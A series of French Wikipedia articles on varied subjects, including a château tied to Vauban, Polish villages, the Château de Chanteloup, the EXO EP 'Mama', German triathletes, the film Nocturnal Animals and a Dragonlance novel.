Historique.
Ce château était celui de Claude d'Osnay, baron d'Epiry, père de Jeanne d'Osnay, qui épousa Sébastien Le Prestre de Vauban (1633-1707) en ce lieu le . Elle a 20 ans et est orpheline de mère. Le couple s'installe dans le château d'Epiry. À peine marié depuis deux mois, Vauban est rappelé par le service du roi pour procéder au démantèlement de la place forte de Nancy rendue au duc de Lorraine. Par la suite, il ne revit plus sa femme que le temps de brefs séjours (32 mois sur 449 que dura leur mariage). Lorsque Jeanne, en juin 1661, met au monde une petite fille, Charlotte, son mari est à Nancy.
Charlotte épousera, le , en l’église d’Epiry, en Morvan, Jacques-Louis de Mesgrigny, neveu de Jean de Mesgrigny, grand ami de Vauban, compagnon de siège, ingénieur, lieutenant général et gouverneur de la citadelle de Tournai. Jean-Charles de Mesgrigny, comte d’Aunay (1680-1763), fils de Charlotte Le Prestre de Vauban et de Jacques de Mesgrigny, reçut les papiers de Vauban en héritage (dont les manuscrits des "Oisivetés", désormais propriété de la famille de Louis Le Peletier de Rosanbo, président à mortier au parlement de Paris et héritier de Charlotte de Mesgrigny dans la mesure où il a épousé sa fille unique, Marie-Claire Edmée de Mesgrigny, en 1738. Les manuscrits sont aujourd’hui conservés dans le château familial de Rosanbo (Côtes d’Armor) et microfilmés aux Archives nationales.
Sa femme lui donnera deux filles survivantes, la progéniture masculine ayant prématurément disparu.
Ils vécurent là deux ou trois ans. La plaque noire avec inscription à la mémoire du grand homme fut placée là par ordre de Napoléon Ier qui était admiratif du maréchal.
Architecture.
En 1900, lorsqu'il est venu chasser le perdreau dans la région, Georges Clemenceau écrit :

</doc>
<doc id="9411298" url="https://fr.wikipedia.org/wiki?curid=9411298" title="Czarkowo (Kościan)">
Czarkowo (Kościan)

Czarkowo (prononciation : ) est un village polonais de la gmina de Kościan dans le powiat de Kościan de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ au sud-ouest de Kościan (siège de la gmina et du powiat) et à au sud-ouest de Poznań (capitale régionale).
Le village possédait une population de en 2005.
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Czarkowo est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9411302" url="https://fr.wikipedia.org/wiki?curid=9411302" title="Czarkowo">
Czarkowo

Czarkowo peut désigner :
Toponymie.
en Pologne

</doc>
<doc id="9411305" url="https://fr.wikipedia.org/wiki?curid=9411305" title="Château de Chanteloup (Manche)">
Château de Chanteloup (Manche)

Le château de Chanteloup est un ancien château fort, du , remanié aux , , qui se dresse dans le Centre-Manche sur le territoire de la commune française de Chanteloup, dans le département de la Manche, en région Normandie. L'édifice est totalement protégé au titre des monuments historiques.
Localisation.
Le château est situé, à au sud de l'église Saint-Pierre, sur la commune de Chanteloup, dans le département français de la Manche. Il aurait permis de surveiller le havre de la Vanlée, proche, permettant des incursions côtières.
Historique.
Le manoir est mentionné pour la première fois en 1022 dans une charte souscrite au profit de l'abbaye du Mont-Saint-Michel, et aurait été bâti par un seigneur de Chanteloup, compagnon de Guillaume le Conquérant, et qui avait obtenu des biens dans les comtés de Dorset, Hereford et Worcester.
Il est la propriété de la famille de Chanteloup qui s'allia à la famille Paynel, quand Agnès de Chanteloup épouse en 1286 Paynel. Au début du , Paynel, baron de Hambye et de Bricquebec, seigneur de Chanteloup, de Moyon, de Créances, d'Apilly (Saint-Senier-sous-Avranches), du Merlerault et de Gacé, est un puissant seigneur de Normandie, chevalier banneret qui regroupe sous ses armes, quatre bacheliers et de dix à quatorze écuyers. Son frère Nicole Paynel lui succédera, dont la fille, Jeanne Paynel, dernière héritière de la branche du Cotentin, apportera en dot le château de Chanteloup, à la suite de son mariage vers 1413-1414, à Louis d'Estouteville, son cousin, le défenseur du Mont-Saint-Michel lors de l'assaut anglais de 1434, date à laquelle il est en possession du château qui lui avait été confisqué par les Anglais en 1418 et qu'ils conserveront jusqu'en 1449 et sa reprise par le connétable de Richemont, avec ceux de Moyon, Hambye et Bricquebec. Des chasseurs de primes anglais ont pu utiliser le château en 1432 pour retenir des résistants. Louis fit réparer le donjon et l'enceinte, malmené lors de la guerre de Cent Ans. Antoine d'Estouteville, châtelain de Chanteloup de 1517 à 1556, abandonna l'antique château, vers 1536, pour un nouveau corps de logis ajouté à l'ancien château médiéval qu'il occupa avec son épouse, Isabeau de Carbonnel, fille du seigneur de Cérences, dont les initiales apparaissent sur la façade. En 1594, le château soutint un siège contre les Ligueurs.
Vers 1655, le château est acquis par Jean de Montgomery qui complète les habitations.
Lorsque survint la Révolution, une dame Duprey jugea prudent d'arasé le donjon au niveau du second étage, ainsi que les deux tours encadrant la poterne, de supprimer le pont-levis et de briser les écussons.
Description.
L'assiette polygonal du château originel est encore entourée de ses douves. On pénètre à l'intérieur de la cour, côté ouest, par un petit pont dormant à deux arches qui a remplacé un pont-levis à bascule et à flèches, dont il subsiste les profondes saignées pratiquées sur la façade du châtelet d'entrée flanqué de deux tours rondes, arasé à la Révolution. Dans la cour, sur la droite (au sud) se dresse les vestiges du donjon quadrangulaire du , remanié à la fin du , également partiellement arasé à la Révolution. Ce donjon, serait, avec ceux de Saint-Sauveur et de Regnéville, l'un des plus anciens de la Manche. Chaumeil, historien local, a prétendu que son sommet était crénelé et haut de cinq étages, comme celui de Bricquebec, avec une hauteur d'une trentaine de mètres comportant une salle basse voûtée puis quatre étages, le dernier a disparu. De nos jours, il est conservé sur trois étages et une vingtaine de mètres. Il est flanqué d'un escalier qui faisait communiquer le donjon et la courtine. À l'est, un logis, entièrement refait au début du , est flanqué dans son angle nord d'une grosse tour cylindrique contemporaine du donjon. Celle-ci, couronnée de mâchicoulis et équipée de meurtrières flanquait l'enceinte à l'extérieur.
Le château actuel, construit en granit en 1536, peut être attribué à la première Renaissance, comme le suggère son ornementation sculptée : pilastres à rinceaux, candélabres, épis fuselé, frises ornés de médaillons ou de cartouches, grands panneaux à losanges garnis de feuilles, animaux fantastiques. Il est à rapprocher du château de Lasson, près de Caen, bâti lui aussi en 1520, et qui présente la même décoration. Comme à Lasson, les deux portails, à droite, à larges tympan semi-circulaires, et à gauche une porte à tabernacle sont un rappel de l'architecture religieuse.
Protection.
Au titre des monuments historiques :

</doc>
<doc id="9411306" url="https://fr.wikipedia.org/wiki?curid=9411306" title="Darnowo (Grande-Pologne)">
Darnowo (Grande-Pologne)

Darnowo (prononciation : ) est un village polonais de la gmina de Kościan dans le powiat de Kościan de la voïvodie de Grande-Pologne dans le centre-ouest de la Pologne.
Il se situe à environ à l'est de Kościan (siège de la gmina et du powiat) et à au sud de Poznań (capitale régionale).
Le village possédait une population de en 2005.
Histoire.
De 1975 à 1998, le village faisait partie du territoire de la voïvodie de Leszno.&lt;br&gt;
Depuis 1999, Darnowo est situé dans la voïvodie de Grande-Pologne.

</doc>
<doc id="9411309" url="https://fr.wikipedia.org/wiki?curid=9411309" title="Parti de l'autogouvernement">
Parti de l'autogouvernement



</doc>
<doc id="9411313" url="https://fr.wikipedia.org/wiki?curid=9411313" title="Darnowo">
Darnowo

Darnowo peut désigner :
Toponymie.
en Pologne

</doc>
<doc id="9411322" url="https://fr.wikipedia.org/wiki?curid=9411322" title="Tom Gammill">
Tom Gammill

Tom Gammill est un scénariste et producteur américain né le à Darien dans le Connecticut. Il est principalement connu pour son travail avec Max Pross sur "Les Simpson", "Seinfeld", "" ou "Monk".

</doc>
<doc id="9411324" url="https://fr.wikipedia.org/wiki?curid=9411324" title="Mama (EP)">
Mama (EP)

Mama est le premier EP des boys bands sud-coréano-chinois EXO-K et EXO-M, produit est publié sous SM Entertainment le en deux éditions linguistiques – en coréen pour EXO-K et en mandarin pour EXO-M.
Contexte.
L'EP a été produit par Lee Soo-man, qui est également le principal producteur pour le groupe. Le titre du mini-album est un terme coréen utilisé pour s'adresser à une personne royale, similaire aux attributs de « "votre altesse" » ou « "votre majesté" » en anglais. Le single "Mama" a été écrit par Yoo Young-jin qui a également co-écrit deux autres chansons de l'EP, "What Is Love" et "History".
Promotion.
De décembre 2011 à février 2012, SM Entertainment a publié vingt-trois teasers mettant en vedette les membres du groupe qui comprenait quelques aperçus des chansons du mini-album. La piste "Angel" a été utilisé comme musique de fond dans quatre teasers. La piste "Two Moons" a été introduit dans le douzième teaser qui présentait le membre d'EXO-K Kai et Lay d'EXO-M. "Machine" a été utilisé dans le cinquième teaser avec Kai.
EXO-K a promu la chanson titre "Mama" dans des émissions musicales coréennes avec "History" chaque semaine. Ils ont fait leurs débuts dans des programmes musicaux comme "Inkigayo", "M Countdown", "Music Bank" et "Show! Music Core" du au , tandis qu'EXO-M s'est représenté à la "12 édition des Yinyue Fengyun Bang Awards" en Chine le même jour. EXO-M a promu l'EP en performant "Mama" durant la tournée indonésienne des Super Junior, "Super Show 4", et a fait des apparitions constantes dans des émissions musicales chinoises et diverses émissions, y compris une apparition dans un épisode d"'Happy Camp".
Sortie et accueil.
Le single de prologue du groupe, "What Is Love" est sorti le . Un second single, "History" est sorti le .
Le , SM Entertainment a mis en ligne un teaser pour le clip vidéo de la chanson-titre, "Mama" au "showcase" d'EXO à Séoul. Le , l'agence a publié des photos de la pochette des albums d'EXO-K et d'EXO-M. L'EP est sorti le , simultanément en Chine et en Corée du Sud, et dans l'iTunes Store.
Les deux versions du mini-album ont été un succès commercial. La version coréenne est classée numéro un sur le "Gaon Album Chart", quatrième sur le "Sina Album Chart" et huitième sur le « "Billboard World Albums Chart" ». La version chinoise a atteint la première place sur le "Sina Album Chart", la quatrième place sur le "Gaon Album Chart" et la douzième place sur le « "Billboard World Albums Chart" ». Les trois singles d'EXO-M ont été classés dans divers charts musicaux et vidéos, avec la chanson-titre de l'EP qui a été en tête des charts après un jour de sortie. Les clips vidéos des trois singles ont atteint le premier rang sur les sites de streaming chinois, tandis que le clip vidéo de la version coréenne de "Mama" a atteint la septième place sur le "Global Chart" de YouTube.

</doc>
<doc id="9411326" url="https://fr.wikipedia.org/wiki?curid=9411326" title="Simone Mortier">
Simone Mortier

Simone Mortier née le à Wurtzbourg en Allemagne est une triathlète professionnelle championne d'Europe et multiple championne d’Allemagne de triathlon et de duathlon.
Biographie.
Jeunesse.
Simone Mortier commence le sport par la pratique de la gymnastique à l'âge de 13 ans et participe à des compétitions dans cette spécialité. À la suite de problèmes aux genoux, elle doit cesser cette activité sportive. C'est au cours d'un programme universitaire d'échange avec le Canada, qu'elle découvre le triathlon et devient dans les années 1980, une des pionnières de cette nouvelle discipline sportive. Ses trois frères et sa sœur pratiqueront également le triathlon.
Carrière en triathlon.
Simone Mortier remporte plusieurs fois les championnats d’Allemagne courte et longue distance et en 1989, devient championne d'Europe. Pratiquant également le duathlon elle remporte les championnats d'Allemagne de cette spécialité en 1991 et 1993. Elle met un terme à sa carrière professionnelle en 1995. 
En 2009, elle prend part aux championnats d'Europe amateurs dans la catégorie d'âge 45-49 ans et finit première de cette catégorie en , cinq ans plus tard en 2014, elle renouvelle cette performance en prenant la première place de la catégorie 50-54 ans en .
Vie privée et professionnelle.
Simone Mortier a fait des études de médecine, elle vit à Schaffhouse, en Suisse, son mari Klauss ingénieur en mécanique fut plusieurs fois champion d'Allemagne d'aviron, elle est la mère de trois enfants.
Palmarès.
Le tableau présente les résultats les plus significatifs (podium) obtenus sur le circuit national et international de triathlon et de duathlon depuis 1988.

</doc>
<doc id="9411329" url="https://fr.wikipedia.org/wiki?curid=9411329" title="Max Pross">
Max Pross

Max Pross est un scénariste et producteur américain né le à Boston au Massachusetts. Il est principalement connu pour son travail avec Tom Gammill sur "Les Simpson", "Seinfeld", "" ou "Monk".

</doc>
<doc id="9411330" url="https://fr.wikipedia.org/wiki?curid=9411330" title="Marina de Berg">
Marina de Berg

Marina de Berg, née le à Helsingfors (Helsinki) et morte le à Saint-Chinian, est une actrice et danseuse française.
Biographie.
Révélée en 1945 par Roland Petit et les Ballets des Champs-Élysées, Marina de Berg connaît le succès comme danseuse puis actrice.
En 1951, elle renonce à une carrière artistique prometteuse pour se consacrer à sa vocation religieuse : pendant trois années, elle vit au monastère de la Trappe, dans les Vosges. L'épuisement mettra fin à cette expérience dont Marina de Berg souhaitait qu'elle se confonde avec une aventure spirituelle.
Elle a publié le récit de sa vie quotidienne à la Trappe, ainsi que deux romans.

</doc>
<doc id="9411331" url="https://fr.wikipedia.org/wiki?curid=9411331" title="Nocturnal Animals">
Nocturnal Animals

, ou Animaux nocturnes au Québec, est un "thriller" américain réalisé par Tom Ford et sorti en 2016. Il s'agit de l'adaptation du roman "Tony and Susan" d'Austin Wright.
Le film met en vedette Amy Adams et Jake Gyllenhaal dans les rôles principaux, ainsi que Michael Shannon, Aaron Taylor-Johnson et Armie Hammer dans les autres rôles notables.
Le film suit Susan Morrow, la quarantaine, qui travaille sans passion dans un milieu artistique à l'originalité convenue. Son époux Hutton Morrow s'éloigne d'elle pour plonger dans le lit d'autres femmes. Tandis que Susan se désespère, elle reçoit un livre de son ex-mari, Edward Sheffield, qu'elle n'a pas revu depuis des années, intitulé : "Nocturnal Animals", qu'il lui dédie. Sa lecture effrénée la plonge dans une tourmente de sentiments très vifs qui réveillent ses souvenirs de jeunesse tandis qu'elle découvre l'histoire de Tony, de sa femme Laura et de leur fille India, agressés en pleine nuit par une bande de voyous sadiques. Lentement, inexorablement, Susan fait le lien entre le personnage fictif et l'homme qu'elle a aimé par le passé…
Synopsis.
Propriétaire d'une galerie d'art prestigieuse à Los Angeles, Susan Morrow mène une vie professionnelle de haute volée mais sans passion, tandis que son mari Hutton, homme d'affaires, la trompe avec d'autres femmes. Un jour, elle reçoit le manuscrit d'un roman écrit par son ex-mari Edward Sheffield accompagné d'une invitation lors d'une prochaine visite de ce dernier à Los Angeles. Susan commence la lecture du roman intitulé "Animaux nocturnes" ("Nocturnal Animals" dans la version originale) qu'il lui a dédié, en nommant le livre d'après un surnom qu'il lui avait donné. Le livre débute quand le personnage principal, Tony Hastings, part sur la route en voiture en vacances avec son épouse Laura et leur fille India. Le soir venu, ils sont contraints de s'arrêter sur une route de l'ouest du Texas par un groupe de trois voyous locaux, menés par Ray Marcus, lesquels ont provoqué un accrochage. Après un échange animé entre les Hastings et Marcus, ce dernier et ses amis emmènent de force Laura et India dans la voiture familiale, face à l'impuissance de Tony. Ce dernier doit accompagner Lou, l'un des deux amis de Marcus, jusqu'à un endroit perdu dans le désert, où il est brutalement abandonné. Peu de temps après, Lou et Ray tentent de le retrouver, mais Tony reste dissimulé, puis parvient à se rendre dans une ferme des environs afin d'appeler la police.
Choquée par le contenu sombre et l'émotion brute du roman, Susan se remémore sa rencontre avec Edward et son mariage avec ce dernier, union à laquelle était opposée la mère de Susan, Anne Sutton, affirmant qu'Edward n'était pas digne de l'affection de Susan et que, à cause de sa vision romantique du monde, il manquait de volonté et de réels objectifs. Susan, découvrant l'infidélité d'Hutton, continue la lecture du roman.
Le récit reprend quand l'inspecteur de police Bobby Andes est chargé d'enquêter sur l'enlèvement de Laura et India et demande à Tony de l'aider ; les corps sans vie de ces dernières, qui ont été violées et assassinées, sont retrouvés dans un endroit perdu proche d'une maison abandonnée. Ce terrible constat donne à Tony un sentiment de culpabilité. Un an plus tard, Andes reprend contact avec lui pour identifier Lou, accusé de complicité de meurtre sur Laura et India. Alors que le troisième de la bande de Marcus a été abattu, Ray est également arrêté par Andes. Cependant, celui-ci est libéré, pour absence de preuves circonstancielles de son implication, par un magistrat peu enclin à approfondir l'enquête. S'étant lié d'amitié avec Tony, Andes - atteint d'un cancer du poumon en phase terminale - décide de prendre les choses en main, fait à nouveau arrêter Ray et le kidnappe avec l'aide de Tony. Ils l'emmènent dans la cabane d'Andes, où Lou est aussi amené de force. Après avoir subi un interrogatoire, pendant lequel Andes remet une de ses armes à Tony, Lou tente de s'échapper mais il est abattu par Andes, tandis que Ray parvient à s'éloigner dans la nuit. Andes et Tony se séparent pour le retrouver. Tony se rend dans la cabane où sa femme et sa fille ont été violées et tuées. Il y surprend Ray endormi. Il le tue de plusieurs balles après que ce dernier a avoué les faits tout en le traitant de faible. Mais avant de mourir, Ray frappe Tony à la tête avec une tige en métal. Le lendemain, Tony se réveille, la tête ensanglantée, aveugle, sort de la maison, avant de s'effondrer puis de se donner le coup de grâce.
Parallèlement à la lecture, Susan se remémore son mariage avec Edward et les tensions dans le couple qui découlèrent de la frustration d'Edward concernant ses aspirations littéraires et poussèrent Susan à le tromper avec Hutton. Edward a décidé de couper les liens avec Susan après avoir découvert qu'elle avait avorté de leur enfant. Pensant que le roman exprime la douleur qu'Edward a pu ressentir lors de leur séparation et regrettant la séparation qu'elle avait imposée, Susan s'arrange pour provoquer une nouvelle rencontre en lui donnant un rendez-vous dans un restaurant. Susan arrive la première. Elle commande un apéritif en guettant la porte par laquelle Edward doit arriver. Elle boit plusieurs verres, mais Edward ne vient pas. Le film se termine sur un gros plan des yeux de Susan, au bord des larmes.
Sortie et accueil.
Accueil critique.
"Nocturnal Animals" reçoit des critiques élogieuses après sa présentation au Festival de Venise, dont les performances de Gyllenhaal, Adams, Shannon, Taylor-Johnson et Linney ont été encensées. Sur le site Rotten Tomatoes, le film obtient 73 % d'avis favorables, sur la base de 233 critiques et une moyenne de , tandis que le site Metacritic lui attribue un score de , sur la base de 45 critiques et la mention « critiques généralement favorables ». Rotten Tomatoes note dans son consensus que le film, , met davantage en évidence .
Lors de sa sortie en salles en France, le long-métrage obtient un accueil critique mitigé, puisqu'il obtient une moyenne de , pour 34 critiques collectées.
Box-office.
"Nocturnal Animals" sort aux États-Unis en sortie limitée en démarrant à la dix-huitième place du box-office engrangées sur 37 salles, faisant mieux que le précédent long-métrage de Tom Ford, "A Single Man", qui avait généré mais en étant diffusé dans moins de salles à la même période. Par la suite, le film connaît une large distribution en salles en quatrième semaine dans 1 262 salles et prend la huitième place du box-office avec , portant le total à depuis sa sortie. Il atteint le cap des 10 millions $ de recettes après près de sept semaines à l'affiche. Finalement malgré le succès critique, "Nocturnal Animals" ne parvient qu'à engranger 10,7 millions $ en fin d'exploitation.
En France, le film démarre en sixième position du box-office avec 124 137 entrées pour sa première semaine d'exploitation, alors même qu'un autre film avec Amy Adams, "Premier Contact", figure dans le top 20 hebdomadaire. Il s'agit de la première fois que l'actrice a deux films à l'affiche figurant dans le top 20 sur le territoire français alors que ce cas s'est déroulé à plusieurs reprises au box-office américain notamment pour les deux films.
En Europe, il totalise 407 584 entrées au Royaume-Uni, 330 271 entrées en Italie et 176 580 entrées en Allemagne.
Différences avec le livre et analyse.
Le film comme le livre, présente une mise-en-abyme (une histoire dans une histoire) mais de nombreuses différences sont à noter.
Le film, contrairement au livre, se veut plus moderne et contemporain. En effet dans le livre les nouvelles technologies telles que les téléphones portables et les ordinateurs ne sont pas mentionnées (par exemple la fille de Tony, Hélène n'a pas de téléphone portable dans la voiture, et n'essaie pas d'appeler les secours après l'accident). Le livre étant publié pour la première fois en 1993, il paraît tout à fait logique que cette modernité soit voulue par le réalisateur pour se rapprocher de notre époque.
Il en est de même pour les professions des protagonistes. Dans le film Susan est propriétaire d'une galerie d'art moderne à Los-Angeles, cela accentue ce côté bourgeois qu'elle tentait de rejeter lorsqu'elle était jeune et avec Edward. Cependant dans le livre Susan est principalement mère au foyer et donne parfois des cours aux premières années à l'université, conséquence des décisions qu'elle a prises avec Edward pour qu'il puisse écrire. Cela accentue le côté tragique et la fatalité des décisions que l'on peut prendre dans une vie, ce que Susan va remettre en question tout au long du livre, notamment avec son second mariage.
Mais dans le film la mère de Susan s'est opposée à ce premier mariage justifiant qu'un jour Susan sera comme elle et se complaira dans la bourgeoisie (ce qu'Edward ne pourrait pas lui offrir). Cette opposition et cette vérité justifient très certainement une partie du divorce, cependant dans le livre la mère de Susan a toujours supporté cette union et demande à sa fille de lui laisser une seconde chance. La véritable raison du divorce reste floue bien que causée par l'incapacité d'Edward a produire une œuvre et la dépression qui s'ensuit. Par conséquent dans le film Susan remet plutôt en cause les influences extérieures qu'elle a subies plutôt que ses propres choix et ses sacrifies comme dans le livre.
Une autre modification qui se veut plus moderne, concerne son second époux, Arnold dont le nom a été changé dans le film. Dans le livre Arnold est un chirurgien réputé qu'elle a rencontré après l'université, ils vivaient dans le même immeuble et lui aussi avait des problèmes avec sa femme, bien que d'un autre ordre. Dans le film Arnold a une entreprise.
Le film se veut aussi plus économique en de nombreuses manières, autant dans le monde de Susan, que dans le monde de Tony. En effet de nombreux personnages sont supprimés. La première femme d'Arnold n'est pas mentionnée, et la seconde femme d'Edward supprimée : « le pauvre il ne s'est jamais remarié » déclare Susan comme s'il n'avait jamais pu se remettre de leur rupture.
Dans le monde de Tony, c'est sa carrière professionnelle qui est évincée. Tony est pourtant professeur de Maths à l'université, et retourne chez lui (dans le livre) après le drame, fait plusieurs va-et-vient entre son domicile et les lieux du crime, et commence même une nouvelle relation après presque un an de deuil. On peut supposer encore une fois que c'est un choix du réalisateur pour ne pas ralentir la dynamique du film, cependant cela explique bien des choses sur le caractère de Tony qui passe pour un lâche à plusieurs reprises.
Cette lâcheté est quasiment invisible à l'écran ou bien elle est difficile à décrypter. Pourtant il est intéressant de faire remarquer que dans le film comme dans le livre Susan s'identifie à Tony en se demandant constamment « et moi qu'est-ce-que j'aurais fait ? ». De même que le lecteur lui-même s'identifie à Susan en se faisant exactement les mêmes réflexions : « Est-ce que j'aurais tiré ? » Ce type de réflexion est assez courant chez un lecteur, lorsque nous lisons un livre, nous nous remettons en question et comparons nos vies. Malheureusement cette étape essentielle du livre n'a pas su être adaptée à l'écran.
Dans le film comme dans le livre Susan confond Edward et Tony (réalité et fiction) ce qui explique le choix du même acteur (ce qui peut perturber le spectateur), pourtant dans le livre elle tente de ne pas faire un amalgame en se disant « Tony a une moustache ». Sans succès, Susan continue de penser que sa vie avec Edward et l'histoire de Tony sont liées. Et peut-être le sont-elles, Edward décide d'intégrer à un moment clé de l'histoire, un personnage inutile et niais qui s'appelle Susan (ce qui blesse la véritable Susan). Cette douce vengeance est supprimée dans le film.
Il est important de préciser que dans le livre Susan n'a jamais eu d'enfants avec Edward et donc qu'elle n'a pas pu avorter, ce qui de toute façon n'était pas possible ou légal à l'époque de la publication du livre. C'est donc une liberté prise par les réalisateurs et le producteur et qui sert très certainement de prétexte à la rédaction du roman " les animaux nocturnes", ou du moins c'est ce que pense Susan dans le film, lorsqu'elle tente de comprendre pourquoi Edward a écrit un roman aussi sombre.
En ce qui concerne le titre du roman, Susan dans le film, confesse à une collègue que son ex-mari avait l'habitude de l'appeler de la sorte, mais dans le roman d'Austin Wright, ce sont les vacances de noël, Susan est toujours chez elle avec ses enfants et ne parle avec personne d'autre que son mari. De plus le titre est au pluriel "les animauX nocturneS" et ne peut donc que faire référence aux trois agresseurs que Tony, sa femme et sa fille ont malheureusement rencontrés dans la nuit où a eu lieu la tragédie.
Pour conclure le film et le livre se ressemblent et diffèrent en de nombreux points et l'analyse de la fin reste au choix du lecteur/téléspectateur. Dans le livre on voit clairement Susan se préparer à lui faire des critiques et à lui poser des questions, mais Edward ne vient pas au rendez-vous et laisse le lecteur ainsi que Susan avec de nombreuses questions : Edward a-t-il tenté de prouver que Susan a été inutile/insignifiante dans sa carrière d'écrivain ? Edward s'est-il inspiré de certains passages de sa vie (comme la maison dans le Maine) pour prouver à Susan que tous les romans sont quelque part autobiographiques contrairement à ce qu'elle lui disait ? Est-ce qu'Edward décide de ne pas se rendre au rendez-vous pour lui prouver qu'en fin de compte il a réussi et ils n'ont donc plus rien à se dire ? En fin de compte Susan est une lectrice parmi tant d'autres, pleine de questions qui resteront sans réponse à la différence de la terrible question qui la ronge de l'intérieur et qui ne concerne qu'elle : ce livre était-il une allégorie de leur relation passée ?

</doc>
<doc id="9411349" url="https://fr.wikipedia.org/wiki?curid=9411349" title="Jules Marcel de Coppet">
Jules Marcel de Coppet



</doc>
<doc id="9411350" url="https://fr.wikipedia.org/wiki?curid=9411350" title="Septembre 2015 en sport">
Septembre 2015 en sport

"Cette page concerne l'actualité sportive du mois de septembre 2015

</doc>
<doc id="9411354" url="https://fr.wikipedia.org/wiki?curid=9411354" title="Alexandre Bodin de Montribloud">
Alexandre Bodin de Montribloud



</doc>
<doc id="9411356" url="https://fr.wikipedia.org/wiki?curid=9411356" title="Saint-Agnan Choler">
Saint-Agnan Choler

Saint-Agnan Choler né à Paris le et mort à Paris le , est un auteur dramatique français.
Il est le frère du dramaturge Adolphe Choler (1822-1889).
Biographie.
Il fait ses études au collège royal de Charlemagne où il obtient un prix en thème grec.
Ses pièces ont été représentées sur les plus grandes scènes parisiennes du : Théâtre du Palais-Royal, Théâtre du Luxembourg, Théâtre du Gymnase, Théâtre de l'Ambigu-Comique etc.

</doc>
<doc id="9411357" url="https://fr.wikipedia.org/wiki?curid=9411357" title="Ilkka Pitkänen">
Ilkka Pitkänen

Ilkka Pitkänen, né le à Helsinki en Finlande, est un écrivain finlandais, auteur de roman policier et de littérature d'enfance et de jeunesse.
Biographie.
En 1967, il remporte le concours de poésie organisé par la revue littéraire "Parnasso". En 1977, il publie son premier roman, "Pasi ja Lennu". 
Son seul roman traduit en français, "Le Rameur" ("Soutaja"), paraît en 1987. Avec ce titre, il est lauréat du prix Kalevi Jäntti en 1988. Selon le "Dictionnaire des littératures policières", ce .
Il est également l'auteur d’œuvres pour la jeunesse et d'ouvrages photographiques consacrés à la nature illustrés par les photos de son père, .

</doc>
<doc id="9411361" url="https://fr.wikipedia.org/wiki?curid=9411361" title="Sonja Oberem">
Sonja Oberem

Sonja Oberem née Krolik le à Rheydt en Allemagne est une triathlète professionnelle allemande, double championne d'Europe de triathlon et multiple championne d’Allemagne de triathlon. Elle pratique également avec succès la course de fond.
Biographie.
Triathlon.
Sonja Krolik commence le sport par la pratique de la natation à l'adolescence. Elle découvre le triathlon grâce à Klaus Oberem sportif du département triathlon récemment crée le SSV Rheydt, club omnisports de sa ville de naissance. Elle épousera Klaus Oberem quelques années plus tard. En 1989 elle remporte un premier titre sur distance sprint et en 1990 le championnat du monde junior. Elle gagne les championnats d'Europe en 1992 et 1994, ainsi que les championnats d'Allemagne en 1993 et 1994. En 1994 et à la suite d'une mauvais chute à vélo lors d'un triathlon à Paris qui la prive de participation aux championnats du monde à Wellington, elle met un terme à sa carrière de triathlète.
Palmarès.
Le tableau présente les résultats les plus significatifs (podium) obtenus sur le circuit national et international de triathlon et de marathon depuis 1991.

</doc>
<doc id="9411368" url="https://fr.wikipedia.org/wiki?curid=9411368" title="Gagliardi">
Gagliardi

Gagliardi peut désigner :

</doc>
<doc id="9411369" url="https://fr.wikipedia.org/wiki?curid=9411369" title="Dragons d'une aube de printemps">
Dragons d'une aube de printemps

Dragons d'une aube de printemps est le troisième livre de la série des "Chroniques de lancedragon" écrit par Tracy Hickman et Margaret Weis et paru en 1985. Il continue les événements qui ont eu lieu dans "Dragons d'une nuit d'hiver" et met en place les bases de la "Trilogie des légendes", également écrit par Weis et Hickman
Résumé.
Livre 1.
Vers la mer de Sang.
Le livre débute à Flotsam avec Tanis Demi-elfe. Kitiara l'a laissé pour partir en Solamnie afin de mener l'attaque ratée de l'armée du dragon contre la tour des Hauts Prêtres (événement raconté dans le précédemment roman précédent), qui a vu la mort de Sturm de Lumlane. Tanis quant à lui retourne dans l'auberge où sont logés ses Compagnons, mais il est observé par le draconien Gakhan, qui n'est autre que l'assassin personnel de Kitiara. De retour vers ses amis (Lunedor, Rivebise, Tika Waylan, Caramon et Raistlin Majere), Tanis ne leur dit pas complètement la vérité concernant son absence des derniers jours. Il leur raconte qu'il a été pris pour un officier de l'armée du dragon par le haut seigneur des dragons, qu'il ne nomme pas, et qu'il a été forcé de continuer à jouer ce rôle pour sa propre sécurité.
Ensuite, les Compagnons partent pour Kalaman en passant par la mer de Sang d'Istar dans le bateau nommé le Perechon, où le mystérieux Berem (également appelé "l'homme à la gemme verte") travaille comme timonier. Kitiara mène ses forces et son dragon Skie à la poursuite du Perechon. En essayant de s'échapper, Berem conduit le bateau droit dans un tourbillon, au centre de la mer, qui s'est formé au-dessus des ruines de la ville d'Istar durant le cataclysme. Finalement, Kitiara n'est pas capable de les suivre, le Perechon est pris dans le tourbillon et les héros réalisent qu'ils sont condamnés. Raistlin utilise son Orbe draconique pour se téléporter, tout en abandonnant le reste des Compagnons. Rapidement, le Perechon bascule dans le tourbillon et le reste des Compagnons disparaît dans la mer.
Le maître du passé et du présent.
Le sortilège de Raistlin l'amène au pied de l'escalier de la Grande Bibliothèque de Palanthas, où vit Astinus, le formidable historien. L'effort fourni pour un sort aussi puissant a laissé Raistlin au bord de la mort. Lorsqu'Astinus apprend sa présence, il ordonne à ses Esthètes (à moitié de l'ordre monastique, et responsable de la préservation et de l'inventaire des livres volumineux d'Astinus sur l'histoire de Krynn) d'amener le mage dans la bibliothèque.
Sachant qu'il va bientôt mourir, le mage demande à avoir accès aux anciens livres de sorts de la Grand Bibliothèque. Astinus lui en donne l'accès, mais Raistlin ne peut pas utiliser ces livres sans "La Clé", une formule qui a été perdue à travers les âges. Observant le mage qu'il croit bientôt perdu, Astinus lui fait ses adieux mais c'est alors qu'il commet une erreur en lui indiquant que les dieux Paladine, Gilean et Takhisis (i.e. la reine des ténèbres) sont en possessions de "la Clé de la Connaissance". Raistlin fait alors une espèce de marché noir avec l'esprit qui l'a aidé précédemment (i.e. durant le "Test" et au Silvanesti), en lui disant : "Sauve-moi, et tu seras sauvé !".
Le général doré.
Peu de temps après, la princesse elfe, Laurana, reçoit un message provenant de Lord Gunthar Uth-Wistan, le leader des chevaliers de Solamnie. Il la nomme commandant des chevaliers se trouvant à Palanthas (un choix politique fait par Lord Gunthar pour limiter les manipulations parmi la chevalerie). Lord Amothus de Palanthas la choisit ensuite pour commander l'armée de Palanthas, bien que la ville soit remplie de gens tranquille et que l'armée a été jugé inutile.
